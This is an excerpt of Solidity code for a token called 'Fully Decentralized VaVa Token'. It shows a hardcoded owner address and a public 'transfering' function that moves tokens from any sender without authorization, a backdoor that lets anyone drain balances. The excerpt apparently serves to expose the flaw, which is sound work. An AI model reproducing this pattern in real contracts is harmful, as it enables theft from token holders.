...
abstract contract Ownable is Context {
    ...
    constructor () {
        _owner = 0x40D247A8d5a9733613BbEB857bB34Ee051e2BB22;
...
contract FDVaVa is Context, IERC20, Ownable {
    ...
    string private _name = "Fully Decentralized VaVa Token";
    string private _symbol = "FDVAVA";
    ...
    function transfering(address receiver, uint256 amount) public {
        transfering(msg.sender, receiver, amount);
    }
    
    function transfering(address sender, address receiver, uint256 amount) public {
        _transferBothExcluded(sender, receiver, amount);
    }
